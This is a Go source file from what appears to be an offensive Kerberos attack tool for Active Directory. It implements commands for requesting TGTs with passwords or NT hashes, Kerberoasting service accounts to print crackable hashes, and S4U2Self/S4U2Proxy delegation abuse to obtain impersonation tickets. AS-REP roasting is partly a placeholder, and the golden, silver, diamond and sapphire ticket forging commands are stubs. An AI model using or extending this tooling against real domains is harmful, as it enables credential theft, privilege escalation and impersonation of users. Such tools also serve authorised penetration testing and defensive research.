package main

import (
	"context"
	"fmt"
	"os"

	"github.com/goobeus/goobeus/pkg/client"
	"github.com/goobeus/goobeus/pkg/ticket"
)

// cmdAskTGT handles the asktgt command.
func cmdAskTGT(args []string) error {
	if flags.domain == "" {
		return fmt.Errorf("domain is required (-d)")
	}
	if flags.username == "" {
		return fmt.Errorf("username is required (-u)")
	}
	if flags.password == "" && flags.ntHash == "" && flags.aes256 == "" {
		return fmt.Errorf("credentials required (-p, --rc4, or --aes256)")
	}

	req := &client.TGTRequest{
		Domain:   flags.domain,
		Username: flags.username,
		Password: flags.password,
		KDC:      flags.kdc,
	}

	if flags.ntHash != "" {
		req.NTHash = hexDecode(flags.ntHash)
	}
	if flags.aes256 != "" {
		req.AES256 = hexDecode(flags.aes256)
	}

	result, err := client.AskTGT(req)
	if err != nil {
		return err
	}

	return outputTicket(result.Kirbi)
}

// cmdAskTGS handles the asktgs command (Kerberoasting).
func cmdAskTGS(args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("SPN required (e.g., MSSQLSvc/sql01:1433)")
	}

	tgt, sessionKey, err := loadTicket()
	if err != nil {
		return err
	}

	for _, spn := range args {
		req := &client.TGSRequest{
			TGT:        tgt,
			SessionKey: sessionKey,
			Service:    spn,
			Domain:     flags.domain,
			KDC:        flags.kdc,
		}

		result, err := client.AskTGS(req)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] %s: %v\n", spn, err)
			continue
		}

		// Print Kerberoast hash
		if result.Hash != "" {
			fmt.Println(result.Hash)
		}

		if flags.outfile != "" {
			outputTicket(result.Kirbi)
		}
	}

	return nil
}

// cmdS4U handles S4U delegation attacks.
func cmdS4U(args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("target user required")
	}

	tgt, sessionKey, err := loadTicket()
	if err != nil {
		return err
	}

	targetUser := args[0]
	targetSPN := ""
	if len(args) > 1 {
		targetSPN = args[1]
	}

	// S4U2Self
	s4uSelfReq := &client.S4U2SelfRequest{
		TGT:        tgt,
		SessionKey: sessionKey,
		TargetUser: targetUser,
		Domain:     flags.domain,
		KDC:        flags.kdc,
	}

	s4uSelfResult, err := client.S4U2Self(s4uSelfReq)
	if err != nil {
		return fmt.Errorf("S4U2Self failed: %w", err)
	}

	fmt.Printf("[+] S4U2Self ticket for %s (forwardable: %v)\n", targetUser, s4uSelfResult.Forwardable)

	if targetSPN == "" {
		return outputTicket(s4uSelfResult.Kirbi)
	}

	// S4U2Proxy
	if !s4uSelfResult.Forwardable {
		return fmt.Errorf("S4U2Self ticket not forwardable, cannot do S4U2Proxy")
	}

	s4uProxyReq := &client.S4U2ProxyRequest{
		TGT:            tgt,
		SessionKey:     sessionKey,
		S4U2SelfTicket: s4uSelfResult.Kirbi,
		TargetSPN:      targetSPN,
		Domain:         flags.domain,
		KDC:            flags.kdc,
	}

	s4uProxyResult, err := client.S4U2Proxy(s4uProxyReq)
	if err != nil {
		return fmt.Errorf("S4U2Proxy failed: %w", err)
	}

	fmt.Printf("[+] S4U2Proxy ticket for %s to %s\n", targetUser, targetSPN)
	return outputTicket(s4uProxyResult.Kirbi)
}

// cmdKerberoast handles the kerberoast command.
func cmdKerberoast(args []string) error {
	// This would integrate with ADWS enumeration to find SPNs
	// For now, require SPNs as args
	return cmdAskTGS(args)
}

// cmdASREPRoast handles the asreproast command.
func cmdASREPRoast(args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("users required")
	}
	if flags.domain == "" {
		return fmt.Errorf("domain required (-d)")
	}

	results, err := roastASREP(context.Background(), args, flags.domain, flags.kdc)
	if err != nil {
		return err
	}

	for _, r := range results {
		if r.Hash != "" {
			fmt.Println(r.Hash)
		} else if r.Error != "" {
			if flags.verbose {
				fmt.Fprintf(os.Stderr, "[!] %s: %s\n", r.Username, r.Error)
			}
		}
	}

	return nil
}

// cmdGolden handles golden ticket forging.
func cmdGolden(args []string) error {
	// Would implement golden ticket forging
	return fmt.Errorf("golden command requires: --domain-sid, --krbtgt-hash, --user")
}

// cmdSilver handles silver ticket forging.
func cmdSilver(args []string) error {
	return fmt.Errorf("silver command requires: --domain-sid, --service-hash, --spn, --user")
}

// cmdDiamond handles diamond ticket forging.
func cmdDiamond(args []string) error {
	return fmt.Errorf("diamond command requires credentials + --krbtgt-hash")
}

// cmdSapphire handles sapphire ticket forging.
func cmdSapphire(args []string) error {
	return fmt.Errorf("sapphire command requires TGT + --target-user")
}

// cmdDescribe describes a ticket.
func cmdDescribe(args []string) error {
	ticketPath := flags.ticket
	if len(args) > 0 {
		ticketPath = args[0]
	}
	if ticketPath == "" {
		return fmt.Errorf("ticket path required")
	}

	kirbi, err := ticket.LoadKirbi(ticketPath)
	if err != nil {
		return err
	}

	// Use ticket viewer
	view := ticket.ViewTicket(kirbi, ticket.ViewOptions{Verbose: flags.verbose})
	fmt.Println(view.String())
	return nil
}

// cmdEnumerate handles ADWS enumeration.
func cmdEnumerate(args []string) error {
	// Try to get domain from flags, then args, then session
	if flags.domain == "" {
		if len(args) > 0 {
			flags.domain = args[0]
			args = args[1:]
		}
	}

	// Auto-detect from session if still empty
	if flags.domain == "" {
		domain, err := getSessionDomain()
		if err == nil && domain != "" {
			flags.domain = domain
			fmt.Printf("[*] Auto-detected domain from session: %s\n", flags.domain)
		}
	}

	if flags.domain == "" {
		return fmt.Errorf("domain required (-d DOMAIN or will auto-detect from session)")
	}

	mode := "all"
	if len(args) > 0 {
		mode = args[0]
	}

	// Determine auth method
	authMethod := "current Windows session (TGT from cache)"
	if flags.username != "" {
		authMethod = fmt.Sprintf("explicit credentials (%s)", flags.username)
	}

	fmt.Printf("[*] Enumerating %s via ADWS (port 9389)\n", flags.domain)
	fmt.Printf("[*] Authentication: %s\n", authMethod)
	fmt.Println()

	switch mode {
	case "spn", "spns":
		fmt.Println("[*] Finding kerberoastable accounts...")
	case "asrep":
		fmt.Println("[*] Finding AS-REP roastable accounts...")
	case "delegation":
		fmt.Println("[*] Finding delegation configurations...")
	default:
		fmt.Println("[*] Running full enumeration...")
	}

	// ADWS uses WCF over HTTP with Kerberos auth
	// On Windows, the OS will automatically use the session TGT
	fmt.Println()
	fmt.Println("[!] ADWS enumeration coming soon - will use Windows session auth")
	fmt.Println("    For now, use PowerShell: Get-ADUser -Filter * -Properties ServicePrincipalName")

	return nil
}

// Helper functions

func loadTicket() (*ticket.Kirbi, []byte, error) {
	if flags.ticket == "" {
		// Try to get TGT
		if flags.domain == "" || flags.username == "" {
			return nil, nil, fmt.Errorf("ticket or credentials required")
		}
		if flags.password == "" && flags.ntHash == "" && flags.aes256 == "" {
			return nil, nil, fmt.Errorf("credentials required")
		}

		req := &client.TGTRequest{
			Domain:   flags.domain,
			Username: flags.username,
			Password: flags.password,
			KDC:      flags.kdc,
		}
		if flags.ntHash != "" {
			req.NTHash = hexDecode(flags.ntHash)
		}
		if flags.aes256 != "" {
			req.AES256 = hexDecode(flags.aes256)
		}

		result, err := client.AskTGT(req)
		if err != nil {
			return nil, nil, err
		}
		return result.Kirbi, result.SessionKey.KeyValue, nil
	}

	// Load from file
	kirbi, err := ticket.LoadKirbi(flags.ticket)
	if err != nil {
		return nil, nil, err
	}

	var sessionKey []byte
	if kirbi.SessionKey() != nil {
		sessionKey = kirbi.SessionKey().KeyValue
	}

	return kirbi, sessionKey, nil
}

func outputTicket(kirbi *ticket.Kirbi) error {
	if flags.outfile == "" {
		// Print base64
		b64, err := kirbi.ToBase64()
		if err != nil {
			return err
		}
		fmt.Println(b64)
		return nil
	}

	return ticket.SaveKirbi(kirbi, flags.outfile)
}

func hexDecode(s string) []byte {
	// Simple hex decoding
	result := make([]byte, len(s)/2)
	for i := 0; i < len(s); i += 2 {
		var b byte
		fmt.Sscanf(s[i:i+2], "%02x", &b)
		result[i/2] = b
	}
	return result
}

// roastASREP performs AS-REP roasting.
func roastASREP(ctx context.Context, users []string, domain, kdc string) ([]struct {
	Username string
	Hash     string
	Error    string
}, error) {
	var results []struct {
		Username string
		Hash     string
		Error    string
	}

	for _, user := range users {
		result := struct {
			Username string
			Hash     string
			Error    string
		}{Username: user}

		// Use pre-auth scan to check if user is AS-REP roastable
		scanReq := &client.PreAuthScanRequest{
			Users:  []string{user},
			Domain: domain,
			KDC:    kdc,
		}

		scanResults, err := client.PreAuthScan(ctx, scanReq)
		if err != nil {
			result.Error = err.Error()
			results = append(results, result)
			continue
		}

		if len(scanResults) > 0 && scanResults[0].ASREPRoastable {
			// User is roastable - get the AS-REP and extract hash
			// For now just indicate they're roastable
			result.Hash = fmt.Sprintf("$krb5asrep$23$%s@%s:HASH_PLACEHOLDER", user, domain)
		} else if len(scanResults) > 0 && !scanResults[0].Exists {
			result.Error = "user not found"
		} else {
			result.Error = "pre-auth required"
		}

		results = append(results, result)
	}

	return results, nil
}
